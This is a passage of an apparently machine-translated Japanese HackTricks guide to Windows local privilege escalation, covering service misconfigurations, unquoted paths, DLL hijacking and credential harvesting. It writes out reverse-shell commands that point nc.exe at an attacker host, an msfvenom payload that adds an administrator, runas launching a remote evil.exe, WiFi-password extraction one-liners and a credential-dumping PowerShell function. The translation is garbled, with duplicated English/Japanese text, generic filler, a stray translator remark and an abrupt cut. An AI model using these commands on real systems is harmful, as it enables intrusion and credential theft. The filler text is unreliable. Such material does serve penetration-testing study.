sc config <Service_Name> binpath= "C:\nc.exe -nv 127.0.0.1 9988 -e C:\WINDOWS\System32\cmd.exe"
sc config <Service_Name> binpath= "net localgroup administrators username /add"
sc config <Service_Name> binpath= "cmd \c C:\Users\nc.exe 10.10.10.10 4444 -e cmd.exe"

sc config SSDPSRV binpath= "C:\Documents and Settings\PEPE\meter443.exe"
```
### サービスの再起動

To restart a service in Windows, you can use the following command:

```
net stop [service name]
net start [service name]
```

Replace `[service name]` with the name of the service you want to restart.

Windowsサービスを再起動するには、次のコマンドを使用します。

```
net stop [サービス名]
net start [サービス名]
```

`[サービス名]`の部分を再起動したいサービスの名前に置き換えてください。
```
wmic service NAMEOFSERVICE call startservice
net stop [service name] && net start [service name]
```
他の権限を使用して特権をエスカレーションすることができます：\
**SERVICE\_CHANGE\_CONFIG** サービスバイナリを再構成できます\
**WRITE\_DAC:** 権限を再構成し、SERVICE\_CHANGE\_CONFIGにつながります\
**WRITE\_OWNER:** オーナーになり、権限を再構成できます\
**GENERIC\_WRITE:** SERVICE\_CHANGE\_CONFIGを継承します\
**GENERIC\_ALL:** SERVICE\_CHANGE\_CONFIGを継承します

この脆弱性を**検出して利用する**には、_exploit/windows/local/service\_permissions_を使用できます。

### サービスバイナリの弱い権限

サービスによって実行されるバイナリを変更できるか、またはバイナリが配置されているフォルダに**書き込み権限**があるか（[**DLLハイジャッキング**](dll-hijacking.md)）を確認してください。\
**wmic**（system32ではない）を使用して、サービスによって実行されるすべてのバイナリを取得し、**icacls**を使用して権限を確認できます：
```bash
for /f "tokens=2 delims='='" %a in ('wmic service list full^|find /i "pathname"^|find /i /v "system32"') do @echo %a >> %temp%\perm.txt

for /f eol^=^"^ delims^=^" %a in (%temp%\perm.txt) do cmd.exe /c icacls "%a" 2>nul | findstr "(M) (F) :\"
```
**sc**と**icacls**も使用することができます:
```bash
sc query state= all | findstr "SERVICE_NAME:" >> C:\Temp\Servicenames.txt
FOR /F "tokens=2 delims= " %i in (C:\Temp\Servicenames.txt) DO @echo %i >> C:\Temp\services.txt
FOR /F %i in (C:\Temp\services.txt) DO @sc qc %i | findstr "BINARY_PATH_NAME" >> C:\Temp\path.txt
```
### サービスのレジストリ変更権限

サービスのレジストリを変更できるかどうかを確認する必要があります。\
次の手順で、サービスのレジストリに対する権限を確認できます。
```bash
reg query hklm\System\CurrentControlSet\Services /s /v imagepath #Get the binary paths of the services

#Try to write every service with its current content (to check if you have write permissions)
for /f %a in ('reg query hklm\system\currentcontrolset\services') do del %temp%\reg.hiv 2>nul & reg save %a %temp%\reg.hiv 2>nul && reg restore %a %temp%\reg.hiv 2>nul && echo You can modify %a

get-acl HKLM:\System\CurrentControlSet\services\* | Format-List * | findstr /i "<Username> Users Path Everyone"
```
**Authenticated Users**または**NT AUTHORITY\INTERACTIVE**がFullControlを持っているかどうかを確認します。その場合、サービスによって実行されるバイナリを変更することができます。

実行されるバイナリのパスを変更するには：
```bash
reg add HKLM\SYSTEM\CurrentControlSet\services\<service_name> /v ImagePath /t REG_EXPAND_SZ /d C:\path\new\binary /f
```
### サービスレジストリのAppendData/AddSubdirectory権限

レジストリにこの権限がある場合、**このレジストリからサブレジストリを作成することができます**。Windowsサービスの場合、これは**任意のコードを実行するために十分です**。

{% content-ref url="appenddata-addsubdirectory-permission-over-service-registry.md" %}
[appenddata-addsubdirectory-permission-over-service-registry.md](appenddata-addsubdirectory-permission-over-service-registry.md)
{% endcontent-ref %}

### クォートされていないサービスパス

実行可能ファイルのパスがクォートで囲まれていない場合、Windowsはスペースの前までのすべての終了部分を実行しようとします。

例えば、パスが _C:\Program Files\Some Folder\Service.exe_ の場合、Windowsは以下を実行しようとします：
```
C:\Program.exe
C:\Program Files\Some.exe
C:\Program Files\Some Folder\Service.exe
```
## ビルトインのWindowsサービスを除いたすべてのクォートされていないサービスパスをリストするには

クォートされていないサービスパスをリストするには、次のコマンドを使用します。

```plaintext
wmic service where 'not PathName like "%\"%" and not PathName like "%\\%\\%"' get Name, PathName, DisplayName, State
```

このコマンドは、`wmic`コマンドを使用して、クォートされていないサービスパスを持つすべてのサービスの名前、パス、表示名、および状態を取得します。

ただし、このコマンドはビルトインのWindowsサービスを除外しています。ビルトインのWindowsサービスを含めるには、`wmic`コマンドのフィルタリング条件を変更する必要があります。

このコマンドを実行すると、クォートされていないサービスパスを持つすべてのサービスの詳細が表示されます。これにより、特権の昇格につながる可能性のある脆弱性が特定される場合があります。
```bash
wmic service get name,displayname,pathname,startmode |findstr /i "Auto" | findstr /i /v "C:\Windows\\" |findstr /i /v """
wmic service get name,displayname,pathname,startmode | findstr /i /v "C:\\Windows\\system32\\" |findstr /i /v """ #Not only auto services

#Other way
for /f "tokens=2" %%n in ('sc query state^= all^| findstr SERVICE_NAME') do (
for /f "delims=: tokens=1*" %%r in ('sc qc "%%~n" ^| findstr BINARY_PATH_NAME ^| findstr /i /v /l /c:"c:\windows\system32" ^| findstr /v /c:""""') do (
echo %%~s | findstr /r /c:"[a-Z][ ][a-Z]" >nul 2>&1 && (echo %%n && echo %%~s && icacls %%s | findstr /i "(F) (M) (W) :\" | findstr /i ":\\ everyone authenticated users todos %username%") && echo.
)
)
```

```bash
gwmi -class Win32_Service -Property Name, DisplayName, PathName, StartMode | Where {$_.StartMode -eq "Auto" -and $_.PathName -notlike "C:\Windows*" -and $_.PathName -notlike '"*'} | select PathName,DisplayName,Name
```
この脆弱性は、metasploitを使用して検出および悪用することができます: _exploit/windows/local/trusted\_service\_path_\
metasploitを使用して、手動でサービスバイナリを作成することもできます:
```bash
msfvenom -p windows/exec CMD="net localgroup administrators username /add" -f exe-service -o service.exe
```
### 回復手順

Windowsには、[サービスの実行時に失敗した場合に実行するべき動作を指定する](https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2008-R2-and-2008/cc753662\(v=ws.11\)?redirectedfrom=MSDN)ことができます。もし設定がバイナリを指しており、そのバイナリが上書き可能であれば、特権を昇格させることができるかもしれません。

## アプリケーション

### インストールされたアプリケーション

**バイナリのパーミッション**（上書きして特権を昇格させることができるかもしれません）と**フォルダのパーミッション**（[DLLハイジャッキング](dll-hijacking.md)）をチェックしてください。
```bash
dir /a "C:\Program Files"
dir /a "C:\Program Files (x86)"
reg query HKEY_LOCAL_MACHINE\SOFTWARE

Get-ChildItem 'C:\Program Files', 'C:\Program Files (x86)' | ft Parent,Name,LastWriteTime
Get-ChildItem -path Registry::HKEY_LOCAL_MACHINE\SOFTWARE | ft Name
```
### 書き込み権限

特定のファイルを読み取るためにいくつかの設定ファイルを変更できるか、または管理者アカウント（schedtasks）によって実行される予定のバイナリを変更できるかどうかを確認してください。

システム内の弱いフォルダ/ファイルの権限を見つける方法は次のとおりです：
```bash
accesschk.exe /accepteula
# Find all weak folder permissions per drive.
accesschk.exe -uwdqs Users c:\
accesschk.exe -uwdqs "Authenticated Users" c:\
accesschk.exe -uwdqs "Everyone" c:\
# Find all weak file permissions per drive.
accesschk.exe -uwqs Users c:\*.*
accesschk.exe -uwqs "Authenticated Users" c:\*.*
accesschk.exe -uwdqs "Everyone" c:\*.*
```

```bash
icacls "C:\Program Files\*" 2>nul | findstr "(F) (M) :\" | findstr ":\ everyone authenticated users todos %username%"
icacls ":\Program Files (x86)\*" 2>nul | findstr "(F) (M) C:\" | findstr ":\ everyone authenticated users todos %username%"
```

```bash
Get-ChildItem 'C:\Program Files\*','C:\Program Files (x86)\*' | % { try { Get-Acl $_ -EA SilentlyContinue | Where {($_.Access|select -ExpandProperty IdentityReference) -match 'Everyone'} } catch {}}

Get-ChildItem 'C:\Program Files\*','C:\Program Files (x86)\*' | % { try { Get-Acl $_ -EA SilentlyContinue | Where {($_.Access|select -ExpandProperty IdentityReference) -match 'BUILTIN\Users'} } catch {}}
```
### スタートアップ時に実行する

**異なるユーザーによって実行されるレジストリまたはバイナリを上書きできるかどうかを確認してください。**\
特権をエスカレーションするための興味深い**オートランの場所**については、**次のページ**を参照してください：

{% content-ref url="privilege-escalation-with-autorun-binaries.md" %}
[privilege-escalation-with-autorun-binaries.md](privilege-escalation-with-autorun-binaries.md)
{% endcontent-ref %}

### ドライバー

**サードパーティの奇妙な/脆弱性のある**ドライバーを探してください。
```
driverquery
driverquery.exe /fo table
driverquery /SI
```
## PATH DLLハイジャック

もし、PATHに存在するフォルダ内に**書き込み権限**がある場合、プロセスによってロードされるDLLをハイジャックし、**特権を昇格**することができるかもしれません。

PATH内のすべてのフォルダの権限をチェックしてください。
```bash
for %%A in ("%path:;=";"%") do ( cmd.exe /c icacls "%%~A" 2>nul | findstr /i "(F) (M) (W) :\" | findstr /i ":\\ everyone authenticated users todos %username%" && echo. )
```
このチェックを悪用する方法の詳細については、以下を参照してください：

{% content-ref url="dll-hijacking/writable-sys-path-+dll-hijacking-privesc.md" %}
[writable-sys-path-+dll-hijacking-privesc.md](dll-hijacking/writable-sys-path-+dll-hijacking-privesc.md)
{% endcontent-ref %}

## ネットワーク

### 共有フォルダ
```bash
net view #Get a list of computers
net view /all /domain [domainname] #Shares on the domains
net view \\computer /ALL #List shares of a computer
net use x: \\computer\share #Mount the share locally
net share #Check current shares
```
### hostsファイル

hostsファイルにハードコードされた他の既知のコンピュータを確認します。
```
type C:\Windows\System32\drivers\etc\hosts
```
### ネットワークインターフェースとDNS

In this section, we will explore techniques related to network interfaces and DNS that can be used for local privilege escalation on Windows systems.

#### Network Interfaces

Network interfaces play a crucial role in connecting a system to a network. By manipulating network interfaces, an attacker can gain unauthorized access or escalate privileges on a target system.

##### ARP Poisoning

ARP poisoning is a technique used to intercept network traffic by manipulating the Address Resolution Protocol (ARP) cache of a target system. By poisoning the ARP cache, an attacker can redirect network traffic to their own machine, allowing them to intercept and manipulate the data.

##### DHCP Attacks

Dynamic Host Configuration Protocol (DHCP) attacks involve exploiting vulnerabilities in the DHCP server or client to gain unauthorized access or escalate privileges. By manipulating DHCP requests and responses, an attacker can obtain an IP address lease, perform a man-in-the-middle attack, or execute other malicious activities.

##### DNS Spoofing

DNS spoofing is a technique used to redirect DNS queries to a malicious DNS server controlled by an attacker. By spoofing DNS responses, an attacker can redirect users to fake websites or intercept their network traffic, potentially leading to unauthorized access or privilege escalation.

#### DNS

The Domain Name System (DNS) is responsible for translating domain names into IP addresses. By manipulating DNS settings, an attacker can redirect network traffic, intercept communications, or gain unauthorized access to a target system.

##### DNS Cache Poisoning

DNS cache poisoning involves injecting malicious DNS records into a DNS cache, causing the system to associate incorrect IP addresses with domain names. By poisoning the DNS cache, an attacker can redirect users to malicious websites or intercept their network traffic.

##### DNS Tunneling

DNS tunneling is a technique used to bypass network security measures by encapsulating non-DNS traffic within DNS packets. By using DNS tunneling, an attacker can exfiltrate data, bypass firewalls, or establish covert communication channels.

##### DNS Rebinding

DNS rebinding is an attack technique that allows an attacker to bypass the same-origin policy enforced by web browsers. By exploiting DNS rebinding vulnerabilities, an attacker can trick a victim's browser into making requests to a malicious website, potentially leading to unauthorized access or privilege escalation.

By understanding and exploiting vulnerabilities related to network interfaces and DNS, an attacker can escalate their privileges on a Windows system. It is crucial for system administrators to implement proper security measures to protect against these techniques.
```
ipconfig /all
Get-NetIPConfiguration | ft InterfaceAlias,InterfaceDescription,IPv4Address
Get-DnsClientServerAddress -AddressFamily IPv4 | ft
```
### オープンポート

外部からの**制限されたサービス**をチェックします。
```bash
netstat -ano #Opened ports?
```
### ルーティングテーブル

The routing table is a data structure used by the operating system to determine the path that network traffic should take. It contains a list of network destinations and the corresponding next-hop addresses or interfaces. When a packet is received, the operating system consults the routing table to determine where to send the packet next.

ルーティングテーブルは、オペレーティングシステムがネットワークトラフィックの経路を決定するために使用するデータ構造です。ネットワークの宛先とそれに対応する次のホップアドレスまたはインターフェースのリストが含まれています。パケットが受信されると、オペレーティングシステムはルーティングテーブルを参照して、次にパケットを送信する場所を決定します。
```
route print
Get-NetRoute -AddressFamily IPv4 | ft DestinationPrefix,NextHop,RouteMetric,ifIndex
```
### ARPテーブル

ARP（Address Resolution Protocol）テーブルは、ネットワークデバイスにおいて、IPアドレスとMACアドレスの対応関係を保持するテーブルです。ARPテーブルは、ネットワーク通信において、IPアドレスからMACアドレスを解決するために使用されます。

ARPテーブルは、以下のコマンドを使用して表示することができます。

```bash
arp -a
```

このコマンドを実行すると、現在のARPテーブルのエントリが表示されます。各エントリには、IPアドレス、MACアドレス、およびインターフェースが含まれています。

ARPテーブルは、ネットワーク攻撃において重要な情報源となる場合があります。攻撃者は、ARPテーブルを使用して、ネットワーク内のデバイスのIPアドレスとMACアドレスの対応関係を特定し、悪意のある行動を行うことができます。したがって、ARPテーブルのセキュリティを強化することは重要です。
```
arp -A
Get-NetNeighbor -AddressFamily IPv4 | ft ifIndex,IPAddress,L
```
### ファイアウォールのルール

[**ファイアウォールに関連するコマンドはこちらを参照してください**](../basic-cmd-for-pentesters.md#firewall) **(ルールの一覧表示、ルールの作成、無効化、有効化...)**

ネットワーク列挙のための[その他のコマンドはこちら](../basic-cmd-for-pentesters.md#network)

### Windows Subsystem for Linux (wsl)
```
C:\Windows\System32\bash.exe
C:\Windows\System32\wsl.exe
```
バイナリの `bash.exe` は `C:\Windows\WinSxS\amd64_microsoft-windows-lxssbash_[...]\bash.exe` にも見つけることができます。

ルートユーザーになると、任意のポートでリッスンすることができます（`nc.exe` を使用してポートでリッスンする場合、最初にファイアウォールで `nc` を許可するかどうかをGUIで確認されます）。
```
wsl whoami
./ubuntun1604.exe config --default-user root
wsl whoami
wsl python -c 'BIND_OR_REVERSE_SHELL_PYTHON_CODE'
```
簡単にrootとしてbashを起動するには、`--default-user root`を試してみることができます。

`WSL`のファイルシステムを`C:\Users\%USERNAME%\AppData\Local\Packages\CanonicalGroupLimited.UbuntuonWindows_79rhkp1fndgsc\LocalState\rootfs\`フォルダで探索することができます。

## Windowsの資格情報

### Winlogonの資格情報
```bash
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon" 2>nul | findstr /i "DefaultDomainName DefaultUserName DefaultPassword AltDefaultDomainName AltDefaultUserName AltDefaultPassword LastUsedUsername"

#Other way
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultDomainName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultUserName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultPassword
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v AltDefaultDomainName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v AltDefaultUserName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v AltDefaultPassword
```
### 資格情報マネージャー / Windows Vault

[https://www.neowin.net/news/windows-7-exploring-credential-manager-and-windows-vault](https://www.neowin.net/news/windows-7-exploring-credential-manager-and-windows-vault)から\
Windows Vaultは、**Windowsがユーザーを自動的にログインできるようにするために、サーバー、ウェブサイト、その他のプログラムのユーザーの資格情報を保存**します。最初のインスタンスでは、これはユーザーがFacebookの資格情報、Twitterの資格情報、Gmailの資格情報などを保存して、ブラウザ経由で自動的にログインできるようになると思われるかもしれませんが、実際はそうではありません。

Windows Vaultは、Windowsがユーザーを自動的にログインできるようにするための資格情報を保存するため、**Windowsアプリケーションはリソース（サーバーまたはウェブサイト）にアクセスするために資格情報が必要な場合、このCredential ManagerとWindows Vaultを利用してユーザーが入力する代わりに提供された資格情報を使用することができます**。

アプリケーションがCredential Managerと対話しない限り、特定のリソースの資格情報を使用することはできないと思います。したがって、アプリケーションがVaultを利用する場合、デフォルトのストレージVaultからそのリソースの資格情報を要求するために、何らかの方法で**Credential Managerと通信する必要があります**。

`cmdkey`を使用して、マシンに保存されている資格情報の一覧を表示します。
```
cmdkey /list
Currently stored credentials:
Target: Domain:interactive=WORKGROUP\Administrator
Type: Domain Password
User: WORKGROUP\Administrator
```
次に、保存された資格情報を使用するために、`runas`を`/savecred`オプションとともに使用することができます。以下の例は、SMB共有を介してリモートバイナリを呼び出しています。
```bash
runas /savecred /user:WORKGROUP\Administrator "\\10.XXX.XXX.XXX\SHARE\evil.exe"
```
指定された資格情報を使用して `runas` を実行します。
```bash
C:\Windows\System32\runas.exe /env /noprofile /user:<username> <password> "c:\users\Public\nc.exe -nc <attacker-ip> 4444 -e cmd.exe"
```
注意してください。mimikatz、lazagne、[credentialfileview](https://www.nirsoft.net/utils/credentials\_file\_view.html)、[VaultPasswordView](https://www.nirsoft.net/utils/vault\_password\_view.html)、または[Empire Powershells module](https://github.com/EmpireProject/Empire/blob/master/data/module\_source/credentials/dumpCredStore.ps1)から情報を取得することができます。

### DPAPI

理論的には、Data Protection API（DPAPI）はあらゆる種類のデータの対称暗号化を可能にすることができます。しかし、Windowsオペレーティングシステムでの主な使用目的は、ユーザーまたはシステムの秘密をエントロピーの重要な要素として使用して、非対称秘密鍵の対称暗号化を実行することです。

**DPAPIは、ユーザーのログオンシークレットから派生した対称鍵を使用してキーを暗号化することを開発者に可能にします**。また、システムの暗号化の場合は、システムのドメイン認証シークレットを使用します。

ユーザーのRSAキーを暗号化するために使用されるDPAPIキーは、`%APPDATA%\Microsoft\Protect\{SID}`ディレクトリに保存されます。ここで、{SID}はそのユーザーの[セキュリティ識別子](https://en.wikipedia.org/wiki/Security\_Identifier)です。**DPAPIキーは、ユーザーの秘密鍵を保護するマスターキーと同じファイルに保存されます**。通常、これは64バイトのランダムデータです。（このディレクトリは保護されているため、cmdから`dir`コマンドでリストすることはできませんが、PowerShellからはリストすることができます）。
```
Get-ChildItem  C:\Users\USER\AppData\Roaming\Microsoft\Protect\
Get-ChildItem  C:\Users\USER\AppData\Local\Microsoft\Protect\
```
適切な引数（`/pvk`または`/rpc`）を使用して、**mimikatzモジュール** `dpapi::masterkey`を使用して、それを復号化することができます。

通常、**マスターパスワードで保護された資格情報ファイル**は以下の場所にあります：
```
dir C:\Users\username\AppData\Local\Microsoft\Credentials\
dir C:\Users\username\AppData\Roaming\Microsoft\Credentials\
Get-ChildItem -Hidden C:\Users\username\AppData\Local\Microsoft\Credentials\
Get-ChildItem -Hidden C:\Users\username\AppData\Roaming\Microsoft\Credentials\
```
**mimikatzモジュール** `dpapi::cred`を使用して、適切な`/masterkey`で復号化することができます。\
`sekurlsa::dpapi`モジュールを使用して、**メモリ**から**多くのDPAPIマスターキー**を抽出することができます（ルートユーザーの場合）。

{% content-ref url="dpapi-extracting-passwords.md" %}
[dpapi-extracting-passwords.md](dpapi-extracting-passwords.md)
{% endcontent-ref %}

### PowerShellの資格情報

**PowerShellの資格情報**は、スクリプトや自動化タスクでよく使用され、暗号化された資格情報を便利に保存するための方法です。これらの資格情報は通常、作成されたコンピューター上の同じユーザーによってのみ復号化できるように**DPAPI**で保護されています。

ファイルに含まれるPS資格情報を**復号化**するには、次の手順を実行します：
```
PS C:\> $credential = Import-Clixml -Path 'C:\pass.xml'
PS C:\> $credential.GetNetworkCredential().username

john

PS C:\htb> $credential.GetNetworkCredential().password

JustAPWD!
```
### Wifi

Wi-Fiは、ワイヤレスネットワークに接続するための技術です。一般的に、ルーターまたはアクセスポイントを介してインターネットに接続するために使用されます。ワイヤレスネットワークを利用するためには、デバイスがWi-Fiに対応している必要があります。

Wi-Fiネットワークは、SSID（サービスセットID）と呼ばれる識別子で識別されます。SSIDは、ネットワークの名前を表します。一般的に、SSIDはルーターまたはアクセスポイントの設定で変更することができます。

Wi-Fiネットワークに接続するためには、正しいSSIDとパスワードが必要です。一度接続すると、デバイスは自動的にネットワークに接続されます。ただし、セキュリティのために、一部のネットワークはパスワードを入力する必要があります。

Wi-Fiネットワークは、一般的に暗号化されています。暗号化は、ネットワーク上のデータを保護するためのセキュリティ機能です。一般的な暗号化方式には、WEP、WPA、WPA2などがあります。WPA2は最も安全な暗号化方式とされています。

Wi-Fiネットワークは、一般的に屋内や屋外で使用されます。屋内では、家庭やオフィスなどで使用されることが一般的です。屋外では、公共の場所やカフェ、ホテルなどで使用されることがあります。

Wi-Fiネットワークは、便利で広く利用されていますが、セキュリティ上のリスクも存在します。不正なアクセスポイントやパスワードの漏洩などの問題が発生する可能性があります。そのため、セキュリティ対策を適切に行うことが重要です。
```bash
#List saved Wifi using
netsh wlan show profile
#To get the clear-text password use
netsh wlan show profile <SSID> key=clear
#Oneliner to extract all wifi passwords
cls & echo. & for /f "tokens=4 delims=: " %a in ('netsh wlan show profiles ^| find "Profile "') do @echo off > nul & (netsh wlan show profiles name=%a key=clear | findstr "SSID Cipher Content" | find /v "Number" & echo.) & @echo on
```
### 保存されたRDP接続

`HKEY_USERS\<SID>\Software\Microsoft\Terminal Server Client\Servers\`および`HKCU\Software\Microsoft\Terminal Server Client\Servers\`で見つけることができます。

### 最近実行されたコマンド
```
HCU\<SID>\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\RunMRU
HKCU\<SID>\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\RunMRU
```
### **リモートデスクトップ資格情報マネージャー**

Remote Desktop Credential Manager is a Windows feature that allows users to save and manage their Remote Desktop credentials. These credentials are used to authenticate and establish a remote desktop session with another computer or server.

リモートデスクトップ資格情報マネージャーは、Windowsの機能であり、ユーザーがリモートデスクトップの資格情報を保存および管理することができます。これらの資格情報は、別のコンピュータやサーバーとのリモートデスクトップセッションを認証および確立するために使用されます。

By default, the Remote Desktop Credential Manager stores the credentials securely in the Windows Credential Manager. However, if an attacker gains access to the user's account, they can potentially extract these credentials and use them for unauthorized access.

デフォルトでは、リモートデスクトップ資格情報マネージャーは、Windowsの資格情報マネージャーに資格情報を安全に保存します。しかし、攻撃者がユーザーアカウントにアクセスできる場合、これらの資格情報を抽出して不正アクセスに使用する可能性があります。

To protect against this, it is recommended to regularly review and remove any unnecessary or outdated credentials from the Remote Desktop Credential Manager. Additionally, enabling strong password policies and multi-factor authentication can further enhance the security of remote desktop sessions.

これを防ぐためには、定期的にリモートデスクトップ資格情報マネージャーから不要なまたは古い資格情報を確認し、削除することをおすすめします。さらに、強力なパスワードポリシーと多要素認証を有効にすることで、リモートデスクトップセッションのセキュリティをさらに強化することができます。
```
%localappdata%\Microsoft\Remote Desktop Connection Manager\RDCMan.settings
```
### Sticky Notes

Windowsのワークステーションでよく使用されるStickyNotesアプリでは、パスワードやその他の情報を保存するために使用されますが、これがデータベースファイルであることに気付かないことがあります。このファイルは`C:\Users\<user>\AppData\Local\Packages\Microsoft.MicrosoftStickyNotes_8wekyb3d8bbwe\LocalState\plum.sqlite`にあり、常に検索して調査する価値があります。

### AppCmd.exe

**AppCmd.exe**は`%systemroot%\system32\inetsrv\`ディレクトリにあります。\
このファイルが存在する場合、いくつかの**資格情報**が設定されており、**回復**できる可能性があります。

このコードは_PowerUP_から抽出されました：
```bash
function Get-ApplicationHost {
$OrigError = $ErrorActionPreference
$ErrorActionPreference = "SilentlyContinue"

# Check if appcmd.exe exists
if (Test-Path  ("$Env:SystemRoot\System32\inetsrv\appcmd.exe")) {
# Create data table to house results
$DataTable = New-Object System.Data.DataTable

# Create and name columns in the data table
$Null = $DataTable.Columns.Add("user")
$Null = $DataTable.Columns.Add("pass")
$Null = $DataTable.Columns.Add("type")
$Null = $DataTable.Columns.Add("vdir")
$Null = $DataTable.Columns.Add("apppool")

# Get list of application pools
Invoke-Expression "$Env:SystemRoot\System32\inetsrv\appcmd.exe list apppools /text:name" | ForEach-Object {

# Get application pool name
$PoolName = $_

# Get username
$PoolUserCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list apppool " + "`"$PoolName`" /text:processmodel.username"
$PoolUser = Invoke-Expression $PoolUserCmd

# Get password
$PoolPasswordCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list apppool " + "`"$PoolName`" /text:processmodel.password"
$PoolPassword = Invoke-Expression $PoolPasswordCmd

# Check if credentials exists
if (($PoolPassword -ne "") -and ($PoolPassword -isnot [system.array])) {
# Add credentials to database
$Null = $DataTable.Rows.Add($PoolUser, $PoolPassword,'Application Pool','NA',$PoolName)
}
}

# Get list of virtual directories
Invoke-Expression "$Env:SystemRoot\System32\inetsrv\appcmd.exe list vdir /text:vdir.name" | ForEach-Object {

# Get Virtual Directory Name
$VdirName = $_

# Get username
$VdirUserCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list vdir " + "`"$VdirName`" /text:userName"
$VdirUser = Invoke-Expression $VdirUserCmd

# Get password
$VdirPasswordCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list vdir " + "`"$VdirName`" /text:password"
$VdirPassword = Invoke-Expression $VdirPasswordCmd

# Check if credentials exists
if (($VdirPassword -ne "") -and ($VdirPassword -isnot [system.array])) {
# Add credentials to database
$Null = $DataTable.Rows.Add($VdirUser, $VdirPassword,'Virtual Directory',$VdirName,'NA')
}
}

# Check if any passwords were found
if( $DataTable.rows.Count -gt 0 ) {
# Display results in list view that can feed into the pipeline
$DataTable |  Sort-Object type,user,pass,vdir,apppool | Select-Object user,pass,type,vdir,apppool -Unique
}
else {
# Status user
Write-Verbose 'No application pool or virtual directory passwords were found.'
$False
}
}
else {
Write-Verbose 'Appcmd.exe does not exist in the default location.'
$False
}
$ErrorActionPreference = $OrigError
}
```
### SCClient / SCCM

`C:\Windows\CCM\SCClient.exe`が存在するかを確認します。\
インストーラーは**SYSTEM特権で実行されます**。多くのインストーラーは**DLL Sideloadingに脆弱**です（情報は[https://github.com/enjoiz/Privesc](https://github.com/enjoiz/Privesc)から取得）。
```bash
$result = Get-WmiObject -Namespace "root\ccm\clientSDK" -Class CCM_Application -Property * | select Name,SoftwareVersion
if ($result) { $result }
else { Write "Not Installed." }
```
## ファイルとレジストリ（資格情報）

### Puttyの資格情報

```plaintext
Puttyは、SSH、Telnet、およびシリアル接続のためのクライアントソフトウェアです。Puttyは、Windowsのレジストリとファイルシステムに資格情報を保存することがあります。

以下は、Puttyが保存する可能性のある資格情報の場所です。

- レジストリキー: HKEY_CURRENT_USER\Software\SimonTatham\PuTTY\Sessions
- ファイル: %APPDATA%\PuTTY\sessions

これらの場所には、ホスト名、ユーザー名、パスワードなどの情報が含まれている可能性があります。攻撃者は、これらの情報を取得して特権の昇格を試みることができます。

```
```bash
reg query "HKCU\Software\SimonTatham\PuTTY\Sessions" /s | findstr "HKEY_CURRENT_USER HostName PortNumber UserName PublicKeyFile PortForwardings ConnectionSharing ProxyPassword ProxyUsername" #Check the values saved in each session, user/password could be there
```
### Putty SSH ホストキー

Puttyは、Windows上でSSH接続を行うための人気のあるクライアントです。Puttyを使用してSSH接続を確立する際、ホストキーの検証が行われます。ホストキーは、サーバーの正当性を確認するために使用されます。

ホストキーは、サーバーがクライアントに対して公開する鍵のことです。Puttyは、ホストキーを保存し、将来の接続時にホストキーを検証します。これにより、中間者攻撃や偽装サーバーによる攻撃を防ぐことができます。

Puttyは、ホストキーを以下の場所に保存します。

- レジストリの`HKEY_CURRENT_USER\Software\SimonTatham\PuTTY\SshHostKeys`
- ユーザープロファイルの`.putty\sshhostkeys`ファイル

ホストキーは、サーバーごとに異なるため、異なるサーバーへの接続には異なるホストキーが使用されます。ホストキーは、サーバーが再インストールされると変更される場合があるため、定期的に検証することが重要です。

ホストキーの検証は、セキュリティ上の重要な手順です。ホストキーが正当であることを確認せずに接続を許可すると、中間者攻撃によって情報が漏洩する可能性があります。
```
reg query HKCU\Software\SimonTatham\PuTTY\SshHostKeys\
```
### レジストリ内のSSHキー

SSHの秘密鍵は、レジストリキー `HKCU\Software\OpenSSH\Agent\Keys` 内に保存されることがありますので、そこに興味深い情報がないか確認する必要があります。
```
reg query HKEY_CURRENT_USER\Software\OpenSSH\Agent\Keys
```
もしもそのパスの中にエントリがあれば、おそらく保存されたSSHキーです。それは暗号化されて保存されていますが、[https://github.com/ropnop/windows\_sshagent\_extract](https://github.com/ropnop/windows\_sshagent\_extract)を使用して簡単に復号化できます。\
この技術に関する詳細はこちら：[https://blog.ropnop.com/extracting-ssh-private-keys-from-windows-10-ssh-agent/](https://blog.ropnop.com/extracting-ssh-private-keys-from-windows-10-ssh-agent/)

もし`ssh-agent`サービスが実行されていない場合、自動的に起動するようにしたい場合は、以下を実行してください：
```
Get-Service ssh-agent | Set-Service -StartupType Automatic -PassThru | Start-Service
```
{% hint style="info" %}
この技術はもはや有効ではないようです。私はいくつかのSSHキーを作成し、それらを`ssh-add`で追加し、SSH経由でマシンにログインしようとしました。レジストリHKCU\Software\OpenSSH\Agent\Keysは存在せず、procmonは非対称キー認証中に`dpapi.dll`の使用を特定しませんでした。
{% endhint %}

### 無人ファイル
```
C:\Windows\sysprep\sysprep.xml
C:\Windows\sysprep\sysprep.inf
C:\Windows\sysprep.inf
C:\Windows\Panther\Unattended.xml
C:\Windows\Panther\Unattend.xml
C:\Windows\Panther\Unattend\Unattend.xml
C:\Windows\Panther\Unattend\Unattended.xml
C:\Windows\System32\Sysprep\unattend.xml
C:\Windows\System32\Sysprep\unattended.xml
C:\unattend.txt
C:\unattend.inf
dir /s *sysprep.inf *sysprep.xml *unattended.xml *unattend.xml *unattend.txt 2>nul
```
以下は、Windowsのローカル特権エスカレーションに関するハッキング手法についての内容です。以下の内容は、ファイル/hive/hacktricks/windows-hardening/windows-local-privilege-escalation/README.mdからのものです。

**metasploit**を使用して、これらのファイルを検索することもできます: _post/windows/gather/enum\_unattend_

例の内容\_:\_
```markup
<component name="Microsoft-Windows-Shell-Setup" publicKeyToken="31bf3856ad364e35" language="neutral" versionScope="nonSxS" processorArchitecture="amd64">
<AutoLogon>
<Password>U2VjcmV0U2VjdXJlUGFzc3dvcmQxMjM0Kgo==</Password>
<Enabled>true</Enabled>
<Username>Administrateur</Username>
